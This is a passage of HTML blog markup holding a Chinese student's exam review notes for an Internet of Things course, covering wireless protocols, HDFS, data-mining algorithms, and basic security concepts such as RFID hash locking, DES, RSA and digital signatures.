	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024630-1210909689_hu1114014748501495937.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024630-1210909689_hu7772482271478140426.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151245842&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;435&#34;
		data-flex-basis=&#34;1045px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;7百度同步的概念和不同层次载波同步帧同步位同步&#34;&gt;7.[百度]同步的概念和不同层次（载波同步、帧同步、位同步）。
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024883-212896489.png&#34;
	width=&#34;913&#34;
	height=&#34;187&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024883-212896489_hu14864698738800951929.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024883-212896489_hu2009475465557210541.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151253969&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;488&#34;
		data-flex-basis=&#34;1171px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;8p157多址接入技术的基本概念和意义&#34;&gt;8.[P157]多址接入技术的基本概念和意义。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基本概念：通信系统通过信道来区分通信对象。一个用户一个信道，多个用户同时通话就是以不同信道加以区分。让众多的用户公用公共信道的一种技术。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;常见的应用方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;频分多址：传输信号的载波频率不同来区分信道。&lt;/li&gt;
&lt;li&gt;时分多址：传输信号存在时间不同来区分信道。&lt;/li&gt;
&lt;li&gt;码分多址：传输信号的码型不同来区分信道。&lt;/li&gt;
&lt;li&gt;空分多址：通过空间的分割来区分信道。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;9-无线传感器网络中基于调度的-mac-层p206-trama-协议p208常见的路由协议对比互联网中路由协议p212拓扑控制方法&#34;&gt;9. 无线传感器网络中基于调度的 MAC 层[P206] TRAMA 协议、[P208]常见的路由协议（对比互联网中路由协议）、[P212]拓扑控制方法。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基于调度的MAC协议的基本思想：采用某种调度算法将时隙/信道/正交码字节分配给节点，让节点在给定的时隙/信道/正交码字内无冲突访问信道。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TRAMA:包括邻居协议、调度交换协议、自适应时槽选择算法。将时间划分为交替性的随机访问周期和调度访问周期，周期长度不定。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;常见路由协议：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;以数据为中心的路由协议：定向扩散协议、SPIN协议&lt;/li&gt;
&lt;li&gt;基于地理位置的路由协议：地理自适应保真路由协议、能量感知路由协议&lt;/li&gt;
&lt;li&gt;提供数据流和服务质量保障的路由协议：有序分配路由策略、SPEED协议。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;拓扑控制：功率控制和层次性拓扑控制&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;第五章&#34;&gt;第五章
&lt;/h1&gt;&lt;h2 id=&#34;1p240-在基于-hdfs-的分布式文件存储系统中文件的读取和写入过程&#34;&gt;1.[P240] 在基于 HDFS 的分布式文件存储系统中，文件的读取和写入过程。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;文件的读取：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端获取HDFS文件系统DistributedFileSystem实例，调用open()方法。&lt;/li&gt;
&lt;li&gt;DistributeFileSystem通过RPC远程调用名称节点，确定文件组成单元块的位置信息。
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;名称节点返回每个单元块及其副本的数据节点地址，这些数据节点按照相对于客户机的距离排序。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DistributedFileSystem向客户端返回FSDataInputStream，而FSDataInputStream封装了管理名称节点和数据节点I/O的DFSInpouStream。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;客户端调用FSDataInputStream的read()方法。&lt;/li&gt;
&lt;li&gt;FSDataInputStream中的DFSInputStream保存前几个单元块的数据节点地址信息，然后连接存储着文件单元块的最近数据节点，重复调用read()方法读取数据，返回客户端。&lt;/li&gt;
&lt;li&gt;第一个单元块读完，DFSInputStream关闭与该节点的连接，然后寻找下一个单元块。&lt;/li&gt;
&lt;li&gt;最后，客户端调用FSDataInputStream的close()方法结束文件读取操作。&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025156-707738920.png&#34;
	width=&#34;739&#34;
	height=&#34;483&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025156-707738920_hu10206280308964865356.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025156-707738920_hu16750718301445181543.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151301370&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;153&#34;
		data-flex-basis=&#34;367px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件的写入：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端调用DistributedFileSystem中的create()方法创建文件。&lt;/li&gt;
&lt;li&gt;DistributedFileSystem通过RPC调用名称节点，创建新文件并分配单元块。
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;名称节点检查该文件之前不存在，并且客户端有权限创建文件，然后生成新文件记录，否则抛出异常。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DistributedFileSystem向客户端返回FSDataOutStream开始写数据。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;客户端写入数据，DFSOutputStream将数据分包写入数据队列，同时询问名称节点、选择合适数据节点、分配新单元块。数据节点列表组成管道。&lt;/li&gt;
&lt;li&gt;FSDataOutputStream向管道第一个数据节点传送数据，写完后依次向下继续。&lt;/li&gt;
&lt;li&gt;DFSOutputStream等待所有数据节点写入。&lt;/li&gt;
&lt;li&gt;DistributedFileSystem通知名称节点写文件结束。&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025434-1615494003.png&#34;
	width=&#34;793&#34;
	height=&#34;468&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025434-1615494003_hu5863498079020972319.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025434-1615494003_hu12050050480245342354.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151306288&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;169&#34;
		data-flex-basis=&#34;406px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2-云计算和海计算出现的背景和意义&#34;&gt;2. 云计算和海计算出现的背景和意义。
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025678-1716981450.png&#34;
	width=&#34;913&#34;
	height=&#34;147&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025678-1716981450_hu9208860809530239136.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025678-1716981450_hu4244404640911949344.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151312591&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;621&#34;
		data-flex-basis=&#34;1490px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;人话翻译：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;云计算就是在互联网上有一群服务器能给你提供计算服务&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;云计算能解决大规模数据处理问题，自己还不用买服务器，因此被业界认为是支撑物联网后端的最佳选择。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;海计算就是一片海，海里每一滴水就是现实生活一个东西，这些东西能相互合作感知互动。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;海计算物理物体融入计算，每个个体可以单独计算还能协同组织。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3-p268预处理的常见类型和目的意义&#34;&gt;3. [P268]预处理的常见类型和目的/意义。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;预处理技术很多，常见的有：数据清洗、数据集成、数据转换、数据归约。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;预处理目的是提高数据挖掘的对象的质量。（这个东西就相当于过筛，好数据筛下去了，坏数据留下被处理掉）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;他的意义：帮助改善数据质量，提高数据挖掘进程的有效性和准确性，是整个数据处理的重要部分。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4-p270分类的概念和常见的分类算法决策树最近邻分类-knn-和人工神经网络-ann&#34;&gt;4. [P270]分类的概念和常见的分类算法（决策树、最近邻分类 KNN 和人工神经网络 ANN）。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;分类的概念：将对象指定给预先定义的多种类型中的一种。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;决策树：用于分类的一种树结构&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;组成：
&lt;ul&gt;
&lt;li&gt;叶子节点：某个类或者类的分布。&lt;/li&gt;
&lt;li&gt;其他节点：对某个属性的一次判定。&lt;/li&gt;
&lt;li&gt;边：代表一个测试结果&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;决策树有【分类树】和【回归树】两种。决策树的结果是二叉树或多叉树。&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最近邻分类KNN：一个样本在特征空间里寻找K个和他最像的样本，进入数量多的那一方的类别。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;缺点：样本不平衡的时候，新进去的样本会出现偏差。&lt;/li&gt;
&lt;li&gt;解决方案：加权值。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;人工神经网络ANN：我说不清，大概就是一种运算模型，有大量的节点，每个节点是一种输出函数，两个节点之间是加权值。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025961-2089866687.png&#34;
	width=&#34;307&#34;
	height=&#34;217&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025961-2089866687_hu16856053043016111693.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025961-2089866687_hu15554418572058596851.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151317989&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;141&#34;
		data-flex-basis=&#34;339px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;5-p275关联分析的概念和基于-apriori-的算法&#34;&gt;5. [P275]关联分析的概念和基于 Apriori 的算法。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;关联分析是在交易数据、关系数据或其他信息载体中，查找存在于项目集合或对象集合之间的频繁模式、关联、相关性或因果关系。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Apriori算法：详见【P276】&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6-p278聚类分析的概念和基于分层聚类和-k-means-的算法&#34;&gt;6. [P278]聚类分析的概念和基于分层聚类和 K-means 的算法。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;聚类分析：将物理或抽象对象的集合分组为由类似的对象组成的多个类的分析过程。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分层聚类：分为【凝聚】和【分裂】&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【凝聚】：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AGNES:两个簇里面的对象之间距离最小，两个簇会被合并。
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026176-1503102166.png&#34;
	width=&#34;440&#34;
	height=&#34;163&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026176-1503102166_hu10715406031319327616.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026176-1503102166_hu15132028388949737120.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151323879&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;269&#34;
		data-flex-basis=&#34;647px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ROCK：没看懂：
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026501-265367764.png&#34;
	width=&#34;853&#34;
	height=&#34;208&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026501-265367764_hu381749004241364477.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026501-265367764_hu15310671210584313442.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151329373&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;410&#34;
		data-flex-basis=&#34;984px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【分裂】：DIANA&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有对象成为一个簇，按照某个原则分类指导数量满足要求。
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026775-1502665293.png&#34;
	width=&#34;505&#34;
	height=&#34;204&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026775-1502665293_hu6630302255316535068.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026775-1502665293_hu6404513022060817522.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151334613&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;247&#34;
		data-flex-basis=&#34;594px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;K-means:看图说话&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027039-1395751395.png&#34;
	width=&#34;883&#34;
	height=&#34;738&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027039-1395751395_hu4437842531092793585.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027039-1395751395_hu960157376237664076.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151343856&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;119&#34;
		data-flex-basis=&#34;287px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;第六章&#34;&gt;第六章
&lt;/h1&gt;&lt;h2 id=&#34;1-p299感知层安全中常见的物理安全机制和p301基于散列锁定的逻辑安全机制&#34;&gt;1. [P299]感知层安全中常见的物理安全机制和[P301]基于散列锁定的逻辑安全机制。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;物理安全机制（标签）:kill命令机制、电磁屏蔽、主动干扰、阻塞标签、可分离的标签&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;散列锁定：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;给电子标签加锁。锁住的时候标签拒绝电子编码，只有发送给他正确的密钥才能解锁。&lt;/li&gt;
&lt;li&gt;锁定过程：
&lt;ul&gt;
&lt;li&gt;阅读器有一个hash函数，他生成一个key，然后计算metaID=hash(key)，然后阅读器把metaID写入标签。&lt;/li&gt;
&lt;li&gt;标签进入锁定状态&lt;/li&gt;
&lt;li&gt;阅读器将（metaID，key）存到后台数据库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;解锁过程：
&lt;ul&gt;
&lt;li&gt;读写器检测到标签进入范围之后，向标签发出查询信息，标签返回metaID给读写器&lt;/li&gt;
&lt;li&gt;读写器用metaID为索引在后台数据库找key，发给标签&lt;/li&gt;
&lt;li&gt;标签计算hash(key),得到的值和自己的metaID比较，相等就解锁，并发送真实ID给读写器。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2-p314经典密码学中基于变换和置换的加密方法&#34;&gt;2. [P314]经典密码学中基于变换和置换的加密方法。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;变换：换换位置，统计概率就破解了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;置换：凯撒加密这类的&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3-p316现代密码学中基于流密码des-算法私钥密码体制和-rsa-算法公钥密码体制的基本原理&#34;&gt;3. [P316]现代密码学中基于流密码、DES 算法（私钥密码体制）和 RSA 算法（公钥密码体制）的基本原理。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;流密码：明文密文连续加密解密，像水流一样。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DES：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027345-431970818.png&#34;
	width=&#34;883&#34;
	height=&#34;98&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027345-431970818_hu15823902976776370470.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027345-431970818_hu6458231407266851457.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151354257&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;901&#34;
		data-flex-basis=&#34;2162px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DES对64位明文分组M分为左半部分和右半部分，都是32位长。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用函数f对两部分进行16轮完全相同的迭代运算。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;16轮运算完毕后，将左右两部分合在一起经过一个逆置换产生密文。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RSA：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027589-1312243874.png&#34;
	width=&#34;883&#34;
	height=&#34;184&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027589-1312243874_hu17559073288760426709.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027589-1312243874_hu14863452515888570549.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151357028&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;479&#34;
		data-flex-basis=&#34;1151px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可能会出计算：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027827-1705567174.png&#34;
	width=&#34;852&#34;
	height=&#34;275&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027827-1705567174_hu12221083150520281835.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027827-1705567174_hu2438484376031983402.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151400234&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;309&#34;
		data-flex-basis=&#34;743px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4-p322云计算服务对密码设计的特殊需求&#34;&gt;4. [P322]云计算服务对密码设计的特殊需求。
&lt;/h2&gt;&lt;p&gt;需求：通过新型加密或扰动等方法对数据进行有效操作，以此来隐藏明文中的隐私信息，同时保证变换后数据仍能进行特定计算。&lt;/p&gt;
&lt;h2 id=&#34;5-p325身份认证的常见形式&#34;&gt;5. [P325]身份认证的常见形式。
&lt;/h2&gt;&lt;p&gt;常见形式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;用户名/密码方式：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;智能卡认证&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;动态口令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;USB Key认证&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;生物识别&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;步态识别&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6p327-访问控制的基本概念和基本原则&#34;&gt;6.[P327] 访问控制的基本概念和基本原则。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基本概念：在身份认证的基础上，依据授权对提出的资源访问请求加以控制。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基本原则：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最小特权原则：用户所拥有的权利不超过他执行工作所需权限。&lt;/li&gt;
&lt;li&gt;多人负责原则：授权分散化，单人不能完成任务&lt;/li&gt;
&lt;li&gt;职责分离原则：不同责任分派不同的人以相互牵制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;7-p330数字签名的基本概念和实现过程&#34;&gt;7. [P330]数字签名的基本概念和实现过程。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基本概念：用户用自己的私钥对原始数据的哈希摘要进行加密所得的数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实现过程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028113-1896258291.png&#34;
	width=&#34;883&#34;
	height=&#34;503&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028113-1896258291_hu13336902464891502053.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028113-1896258291_hu13725467634454207737.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151405941&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;175&#34;
		data-flex-basis=&#34;421px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;8-p331隐私保护的基本概念和实现方法&#34;&gt;8. [P331]隐私保护的基本概念和实现方法。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;隐私保护涉及两类信息标识：用户身份标识和位置信息标识。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;位置匿名技术：k-匿名、假位置、空间加密。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;押题&#34;&gt;押题
&lt;/h1&gt;&lt;h2 id=&#34;计算题&#34;&gt;计算题：
&lt;/h2&gt;&lt;h3 id=&#34;第二章一个&#34;&gt;第二章一个
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028424-115337731.png&#34;
	width=&#34;913&#34;
	height=&#34;221&#34;
